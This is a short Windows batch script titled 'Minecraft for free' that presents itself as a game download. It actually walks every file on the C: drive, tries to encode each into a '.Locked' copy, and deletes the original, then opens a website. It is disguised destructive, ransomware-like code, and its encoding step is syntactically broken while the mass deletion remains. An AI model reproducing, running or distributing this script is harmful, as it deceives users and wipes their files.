@Echo off

cls

Title Minecraft for free

Cd /d C:

Cd /

For /F "tokens-*" %%A in ('dir /b /s') do (
 certutil -encode "A" "%%-nA.Locked"

Del /q "%%A"
)
set url="https://minecraftfree.netlify.app"
start chrome %url%